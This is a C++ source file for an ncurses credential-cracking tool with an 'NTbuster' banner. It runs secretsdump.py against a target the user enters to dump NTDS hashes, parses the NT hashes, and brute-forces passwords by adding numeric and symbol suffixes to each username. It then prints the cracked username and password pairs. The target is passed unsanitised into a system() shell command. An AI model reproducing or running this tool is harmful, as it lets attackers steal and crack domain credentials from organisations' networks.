#include <iostream>
#include <vector>
#include "ntlm.h"
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <unordered_map>
#include <regex>
#include <ncurses.h>
#include <cstring>
#include <cstring>
using namespace std;

class Cracker {
    public:
        string ip_address;
        string username;
        string password;
        string target;

        std::vector<string> generate(string username) {
            std::vector<string> usernames;
            std::string busername = username;
            std::vector<string> mixed_extensions = extender(extensions);
            for (const auto& extension : mixed_extensions) {    
                username.append(extension);
                usernames.push_back(username);
                username = busername;
            }
            return usernames;
        }

        std::pair<bool, string> crack(std::vector<string> wordlist, const char* hash){
            for (int i = 0; i < wordlist.size(); i++) {
                const char* generated_hash = gen_ntlm(wordlist[i]);
                if (std::strcmp(hash, generated_hash) == 0) {
                    return std::make_pair(true, wordlist[i]);
                }
            }
            return std::make_pair(false, "");
        }
        
        string get_ntds() {
            std::string command = "/usr/bin/python3 ./scripts/secretsdump.py ";
            std::stringstream ss;
            ss << command << target << " > /tmp/output.txt";
            command = ss.str();
            system(command.c_str());
            ifstream fin("/tmp/output.txt");
            string output = "";
            while (fin) {
                string line;
                getline(fin, line);
                output += line + "\n";
            }
            return output;
        }

        std::unordered_map<std::string, std::string>  parse_hashes(const std::string& input) {        
            std::unordered_map<std::string, std::string> result;
            std::regex re("nthash\\)(.*?)\\[\\*\\]");
            std::string modified_input = input; // Create a non-const copy of the input string
            std::string helper_for_regex = "\n";
            std::smatch match;
            size_t pos = 0;
            std::string matched_str;
            std::vector<std::string> split_result;
            std::vector<std::string> split_result_line;
            std::string token;
            std::string token_line;
            std::istringstream iss("");
            std::istringstream iss_line("");
            std::unordered_map<std::string, std::string> creds;

            while ((pos = modified_input.find(helper_for_regex, pos)) != std::string::npos) {
                modified_input.replace(pos, helper_for_regex.length(), "^");
                pos += 6; // Move past the replaced string
            }
            
            if (std::regex_search(modified_input, match, re)) {
                matched_str = match[1].str();
            };

            iss.str(matched_str);
            
            while (std::getline(iss, token, '^')){
                split_result.push_back(token);
            }

            for (const auto& str : split_result) {
                iss_line.clear();
                split_result_line.clear();
                iss_line.str(str);

                while (std::getline(iss_line, token, ':')){
                    split_result_line.push_back(token);
                }
                if (split_result_line.size() >= 3) {
                    creds[split_result_line[0]] = split_result_line[3];
                }
            }
            return creds;
        }

        std::vector<string> launch() {
            std::string output = get_ntds();
            std::unordered_map<std::string, std::string> creds = parse_hashes(output);
            std::vector<string> resp;
            std::pair<bool, string> crack_status;
            for (const auto& kv : creds) {
                crack_status = std::make_pair(false, "");
                std::vector<string> wl = generate(kv.first);
                crack_status = crack(wl, kv.second.c_str());
                if (crack_status.first) {
                    resp.push_back("Username: " +
                        kv.first +
                        " & Password: " +
                        crack_status.second);
                }
            }
            return resp;
        }

    private:
        std::vector<std::string> extensions = {
            "123456",
            "654321",
            "1234567",
            "7654321",
            "12345678",
            "87654321",
            "123456789",
            "987654321",
            "1234567890",
            "0987654321",
            "000",
            "001",
            "002",
            "003",
            "004",
            "005",
            "007",
            "008",
            "009"
    };

    std::vector<std::string> extender(std::vector<std::string> initial_extensions){
        std::vector<std::string> extensions;
        for (int i = 1; i < 99999; i++) {
            std::string str_i = std::to_string(i);
            extensions.push_back(str_i);
            extensions.push_back(str_i + "!");
            extensions.push_back(str_i + "!!");
            extensions.push_back(str_i + "!!!");
            extensions.push_back(str_i + "@");
            extensions.push_back(str_i + "!@#");
            extensions.push_back(str_i + "!@");
            extensions.push_back(str_i + "!@#$%");
            extensions.push_back(str_i + "!@#$%^");
        }
        initial_extensions.insert(initial_extensions.end(), 
                                    extensions.begin(), 
                                    extensions.end());
        return initial_extensions;
    }
};

int main() {
    // initialize ncurses
    initscr();
    cbreak();
    keypad(stdscr, TRUE);

    // set up colors
    start_color();
    init_pair(1, COLOR_CYAN, COLOR_BLACK);
    init_pair(2, COLOR_MAGENTA, COLOR_BLACK);
    init_pair(3, COLOR_YELLOW, COLOR_BLACK);
    init_pair(4, COLOR_GREEN, COLOR_BLACK);
    init_pair(5, COLOR_RED, COLOR_BLACK);
    attron(COLOR_PAIR(1));

    // draw banner
    const char* banner_text = "    _   __________               __           \n"
                     "   / | / /_  __/ /_  __  _______/ /____  _____\n"
                     "  /  |/ / / / / __ \\/ / / / ___/ __/ _ \\/ ___/\n"
                     " / /|  / / / / /_/ / /_/ (__  ) /_/  __/ /    \n"
                     "/_/ |_/ /_/ /_.___/\\__,_/____/\\__/\\___/_/     \n";

    int y = LINES / 2 - 6;
    printw(banner_text);
    move(y + 6, 0);
    refresh();

    // get target value from user input
    mvprintw(LINES / 2 + 2, COLS / 2 - 12, "Enter target: ");
    echo();
    char target[100];
    getstr(target);
    noecho();
    clear();
    target[strcspn(target, "\n")] = 0;

    // display user's input
    printw(banner_text);
    refresh();

    // use target value
    Cracker C;
    C.target = target;
    std::vector<string> response = C.launch();
    int response_y = LINES / 2 + 2;
    int response_x = 2; // starting position of the table

    // print table headers
    attron(COLOR_PAIR(4));
    mvprintw(response_y, response_x, "%-10s %-20s", "Status", "Response");
    response_y++;

    for (const auto& resp : response) {
        attron(COLOR_PAIR(5));
        mvprintw(response_y, response_x, "%-10s %-20s", "Cracked", resp.c_str());
        response_y++;
    }
    refresh();
    getch();
    // clean up ncurses and exit
    endwin();
    return 0;
}